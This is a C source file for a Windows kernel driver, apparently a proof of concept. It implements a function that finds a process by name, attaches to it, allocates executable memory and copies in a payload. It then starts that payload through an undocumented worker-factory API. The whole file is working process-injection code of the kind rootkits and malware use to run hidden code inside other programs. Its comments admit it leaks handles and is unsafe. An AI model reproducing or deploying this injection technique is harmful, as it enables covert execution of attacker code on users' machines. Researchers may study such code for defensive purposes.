#include <ntifs.h>
#include <ntddk.h>

#include "inject.h"

#ifdef ALLOC_PRAGMA
#pragma alloc_text( PAGE, InjectWorkFactory )
#endif

//
// WARNING: This code is NOT production-ready to copypasta!!!
// It leaks handles n shit cuz it's a PoC and #lazy
// And some of the handles need real security attributes to not be vulnerable
// And its undocumented stuff so Microsoft could also break it at any patch
// You have been warned.
//
NTSTATUS NTAPI InjectWorkFactory(
	_In_ PCHAR ProcessInsensitiveName,
	_In_ PUCHAR UserModePayload,
	_In_ SIZE_T UserModePayloadSize,
	_In_ ULONG PoolTag,
	_In_ PINJECT_WORK_FACTORY_FUNCTIONS Functions
)
{
	NTSTATUS Status = STATUS_NOT_FOUND;

	PKAPC_STATE ApcState = ExAllocatePoolWithTag(NonPagedPool, sizeof(KAPC_STATE), PoolTag);
	if (ApcState == NULL)
		return STATUS_INSUFFICIENT_RESOURCES;

	for (ULONG ProcessId = 4; ProcessId < 0xffff; ProcessId += 4)
	{
		PEPROCESS Process = NULL;

		if (!NT_SUCCESS(Status = PsLookupProcessByProcessId((HANDLE)ProcessId, &Process)))
			continue;


		if (_stricmp(ProcessInsensitiveName, Functions->__PsGetProcessImageFileName(Process)) != 0)
		{
			ObDereferenceObject(Process);
			continue;
		}

		Status = STATUS_SUCCESS;
		KeStackAttachProcess((PRKPROCESS)Process, ApcState);

		// we're just going to leak handles/vram in here cuz #yolo
		do {
			HANDLE ProcessHandle = (HANDLE)-1; // current process

			PVOID UserAddress = NULL;
			if (!NT_SUCCESS(Status = ZwAllocateVirtualMemory(ProcessHandle, &UserAddress, 0, &UserModePayloadSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE)))
				break;

			RtlCopyMemory(UserAddress, UserModePayload, UserModePayloadSize);

			HANDLE IoCompletionHandle = NULL;
			ACCESS_MASK IoCompletionAllAccess = STANDARD_RIGHTS_REQUIRED | SYNCHRONIZE | 0x3;
			if (!NT_SUCCESS(Status = Functions->__ZwCreateIoCompletion(&IoCompletionHandle, IoCompletionAllAccess, NULL, 1)))
				break;

			HANDLE WorkerFactoryHandle = NULL;
			ACCESS_MASK WorkerAccess = 0xF00FF; // 0xF00FF is what a recent ntdll uses, WORKER_FACTORY_ALL_ACCESS = 0xf003f

			Status = Functions->__ZwCreateWorkerFactory(
				&WorkerFactoryHandle, 
				WorkerAccess, 
				NULL, 
				IoCompletionHandle, 
				ProcessHandle, 
				UserAddress, 
				NULL, 
				1, 
				32768, 
				32768
			);

			if (!NT_SUCCESS(Status))
			{
				return Status;
			}

			UINT32 MinimumThreads = 1;
			Status = Functions->__ZwSetInformationWorkerFactory(
				WorkerFactoryHandle, 
				WorkerFactoryMinimumThreadInformation, 
				&MinimumThreads, 
				sizeof(MinimumThreads)
			);

			if (!NT_SUCCESS(Status))
			{
				return Status;
			}
		} while (0);

		KeUnstackDetachProcess(ApcState);
		ObDereferenceObject(Process);
		break;
	}

	ExFreePoolWithTag(ApcState, PoolTag);

	return Status;
}